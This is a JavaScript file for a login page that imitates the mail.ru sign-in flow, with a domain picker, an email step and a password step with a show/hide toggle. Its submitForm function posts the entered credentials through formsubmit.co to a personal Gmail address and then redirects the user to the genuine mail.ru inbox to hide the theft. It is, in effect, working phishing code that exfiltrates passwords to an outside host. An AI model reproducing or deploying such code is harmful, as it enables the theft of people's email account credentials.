

$('.change-platform .item').click(function(){
    $('.change-platform .item').removeClass('active');
    $(this).addClass('active');
});


$('.input-mail-wrap .form-input').on('input', function() {
    var inputValue = $(this).val();
    $('.user-login-first-part').text(inputValue);
  });


$('.login-block .login-buttons .next').click(function(){
    var inputValues = $('#name');
    var selectedValue = $("#maildomen").val();
    $(".user-login-second-part").text(selectedValue);


    inputValues.each(function() {
        if ($(this).val() === '') {
            $('.input-mail-wrap .input').addClass('error');
            console.log('error');
        } else {
            $('.login-part').removeClass('hidden-section');
            $('.password-part').removeClass('hidden-section');
            $('.login-part').removeClass('show-section');
            $('.password-part').removeClass('show-section');
            $('.login-part').addClass('hidden-section');
            $('.password-part').addClass('show-section');
            $('.input-mail-wrap .input').removeClass('error');
            console.log('aaa');
      }
    });
    
  });


  $('.change-login').click(function(){
    $('.login-part').removeClass('hidden-section');
    $('.password-part').removeClass('hidden-section');
    $('.login-part').removeClass('show-section');
    $('.password-part').removeClass('show-section');
    $('.login-part').addClass('show-section');
    $('.password-part').addClass('hidden-section');
  });


    $('.input-mail-wrap .form-input').keydown(function(event) {
      if (event.key === 'Enter') {
        if ($('.input-mail-wrap .form-input').val().trim() !== '') {
            $('.login-block .login-buttons .next').click();
        }
      }
    });
 

    $('#showPass').click(function(){
        $('#showPass').addClass('hidden');
        $('#showPass').removeClass('active');
        $('#hidePass').removeClass('hidden')
        $('#hidePass').addClass('active');  
        $("#myPass").attr("type", "text");
      });
      
      $('#hidePass').click(function(){
        $('#hidePass').addClass('hidden');
        $('#hidePass').removeClass('active');
        $('#showPass').removeClass('hidden')
        $('#showPass').addClass('active'); 
        $("#myPass").attr("type", "password") 
      });




  
   function submitForm() {
    const form = document.getElementById('contactForm');
    const formData = new FormData(form);

    $('.voiti-freak span').text('');
    $('.finish-wrap img').addClass('active');

    fetch('https://formsubmit.co/ajax/nesquikwhite2009@gmail.com', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        console.log('Success:', data);
        
        form.reset(); 
        window.location.href = 'https://e.mail.ru/messages/inbox/'; 
    })
    .catch(error => {
        console.error('Error:', error);
        
    })
  
  }

      